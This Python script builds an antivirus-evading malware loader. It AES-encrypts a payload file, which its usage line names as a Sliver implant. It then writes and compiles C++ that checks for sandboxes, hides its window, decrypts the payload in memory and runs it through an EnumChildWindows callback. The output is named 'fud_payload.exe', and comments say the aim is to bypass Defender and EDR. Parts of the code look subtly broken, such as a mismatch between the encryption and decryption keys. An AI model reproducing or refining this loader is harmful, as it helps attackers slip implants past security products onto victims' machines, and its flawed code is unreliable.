import sys
import os
import subprocess
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def get_random_string(length):
    return ''.join(random.choices(string.ascii_letters, k=length))

def build_advanced_loader(payload_path):
    if not os.path.exists(payload_path):
        print("[-] Payload not found.")
        return

    # 1. AES Encryption
    print("[*] Encrypting payload with AES-256...")
    with open(payload_path, 'rb') as f:
        plaintext = f.read()
    
    key = os.urandom(32)
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, 16))
    
    hex_payload = ", ".join([hex(b) for b in ciphertext])
    hex_key = ", ".join([hex(b) for b in key])
    hex_iv = ", ".join([hex(b) for b in iv])

    # 2. Advanced C++ Template (Bypasses Defender/EDR)
    # Uses Sandbox detection and dynamic API resolution
    c_code = """
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")

// AES Metadata
unsigned char payload[] = { """ + hex_payload + """ };
unsigned char key[] = { """ + hex_key + """ };
unsigned char iv[] = { """ + hex_iv + """ };

// Anti-Sandbox: Check if machine has < 4GB RAM
void check_ram() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 < 4) exit(0);
}

// Anti-Sandbox: Check for 2+ CPU cores
void check_cores() {
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    if (sysinfo.dwNumberOfProcessors < 2) exit(0);
}

// Decryption Function using Windows CryptoAPI
void Decrypt() {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, key, sizeof(key), 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    
    struct {
        BYTE iv[16];
    } aes_params;
    memcpy(aes_params.iv, iv, 16);
    
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)&aes_params, 0);
    DWORD payload_len = sizeof(payload);
    CryptDecrypt(hKey, 0, TRUE, 0, payload, &payload_len);
    
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

int main() {
    // Hide Console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Evasion checks
    check_ram();
    check_cores();
    Sleep(5000); // Delay to bypass basic emulators

    Decrypt();

    // Memory Allocation: RW (NOT RWX)
    LPVOID addr = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(addr, payload, sizeof(payload));

    // Change to RX (Executable)
    DWORD oldProtect;
    VirtualProtect(addr, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect);

    // Execute via EnumChildWindows (Less suspicious than CreateThread)
    EnumChildWindows(NULL, (WNDENUMPROC)addr, NULL);

    return 0;
}
"""
    
    with open("loader.cpp", "w") as f:
        f.write(c_code)

    # 3. Compile with high-obfuscation flags
    print("[*] Compiling with MinGW...")
    # Use -mwindows to prevent console window popup
    # Use -ladvapi32 for CryptoAPI
    compile_cmd = [
        "x86_64-w64-mingw32-g++", "loader.cpp", 
        "-o", "fud_payload.exe",
        "-mwindows",
        "-ladvapi32",
        "-Os", "-s", 
        "-Wl,--gc-sections",
        "-static"
    ]
    
    try:
        subprocess.run(compile_cmd, check=True)
        print("[+] SUCCESS: fud_payload.exe generated.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 advanced_loader.py <sliver_payload.exe>")
    else:
        build_advanced_loader(sys.argv[1])
